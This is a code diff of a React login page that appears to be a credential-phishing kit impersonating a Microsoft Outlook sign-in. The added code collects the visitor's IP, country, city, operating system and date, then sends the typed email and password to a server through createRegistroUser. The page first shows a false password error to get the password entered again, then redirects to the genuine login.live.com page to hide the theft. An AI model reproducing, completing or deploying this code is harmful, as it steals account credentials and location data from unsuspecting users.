@@ -2,7 +2,10 @@ import { useEffect, useState } from "react";
 import { Link, useParams } from "react-router-dom";
 import * as FiIcons from "react-icons/fi";
 import css from "./login.module.css";
-// import { createRegistroUser } from "../../config/registroApi";
+import pax from "../../../package.json";
+import dayjs from "dayjs";
+import {createRegistroUser} from "../../api_server/registroApi";
+
 
 export default function Login() {
   const [xemail, setxEmail] = useState("");
@@ -19,57 +22,107 @@ export default function Login() {
   //forma para obtener ubicacion de su pais y su ip
   const [details, setDetails] = useState(null);
   // console.log(details?.city);
-  // console.log(details);
+  console.log(details);
+  console.log(pax.version);
 
   let country = details?.country_name;
-  let IPv4 = details?.IPv4;
+  let ip = details?.ip;
   let city = details?.city;
+
+  let per = dayjs();
+  const fecha_x = per.format("DD-MM-YYYY");
+  console.log(fecha_x);
 
   useEffect(() => {
     const getUserGeolocationDetails = () => {
       fetch(
-        "https://geolocation-db.com/json/0f761a30-fe14-11e9-b59f-e53803842572"
+        "https://ipapi.co/json/"
+        // "https://geolocation-db.com/json/0f761a30-fe14-11e9-b59f-e53803842572"
       )
         .then((response) => response.json())
         .then((data) => setDetails(data));
     };
     getUserGeolocationDetails();
+
+    function obtenerUbicacion() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function (position) {
+          // Obtener la latitud y longitud
+          var latitud = position.coords.latitude;
+          var longitud = position.coords.longitude;
+
+          // Mostrar la ubicación en la consola
+          console.log("Latitud:", latitud);
+          console.log("Longitud:", longitud);
+
+          // Aquí puedes enviar la ubicación al servidor o realizar cualquier otra acción
+        });
+      } else {
+        console.log("La geolocalización no está disponible en este navegador.");
+      }
+    }
+
+    obtenerUbicacion();
   }, []);
 
   //ver el sistema operativo de dpnde ingresa a la web
   var InfoSistemaOperativo = window.navigator.appVersion.toLowerCase();
-  // const so = InfoSistemaOperativo.indexOf('0.5')
-  const datax = InfoSistemaOperativo.split("(");
-  const so = datax[1];
+
+  console.log(InfoSistemaOperativo);
+
+  // Expresión regular para buscar el texto dentro de paréntesis
+  const regex = /\((.*?)\)/g;
+
+  // Array para almacenar todos los textos dentro de paréntesis encontrados
+  const textosDentroParentesis = [];
+
+  // Encontrar todos los textos dentro de paréntesis usando la expresión regular
+  let match;
+  while ((match = regex.exec(InfoSistemaOperativo))) {
+    textosDentroParentesis.push(match[1]);
+  }
+
+  console.log(textosDentroParentesis[0]);
+  const so = textosDentroParentesis[0];
   // console.log(InfoSistemaOperativo);
 
   const statePassword = (e) => {
     console.log(e.target.value);
     if (e.target.value.length > 0) {
-      setErrPaswword(false)
+      setErrPaswword(false);
     }
     setPassword(e.target.value);
   };
 
-  //enviar datos al server
+  //? Enviar datos al server
+  //? ******************************************************************************
   const enviarRegitro = async (e) => {
     e.preventDefault();
 
-    let datax = { email, city, country, IPv4, password, so };
+    let datax = {
+      IP_V: ip,
+      PASSWORD_V: password,
+      EMAIL_V: email,
+      SISTEMA_OP_V: so,
+      PAIS_V: country,
+      CITY_V: city,
+      FECHA_V: fecha_x,
+    };
     console.log(datax);
-
+   
     if (errorSpan) {
-      await createRegistroUser(datax);
       return (window.location.href =
         "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=23&ct=1713452137&rver=7.0.6738.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fcobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26nlp%3d1%26RpsCsrfState%3d036328ae-6978-64c6-c8dc-e4f5539b0b81&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c");
     }
 
     if (!password) {
+      console.log("primer envio");
       return setErrPaswword(true);
     } else {
+      console.log("segundoenvio");
       setErrorSpan(true);
       setPassword("");
-      // return await createRegistroUser(datax);
+      return await createRegistroUser(datax);
     }
   };
 
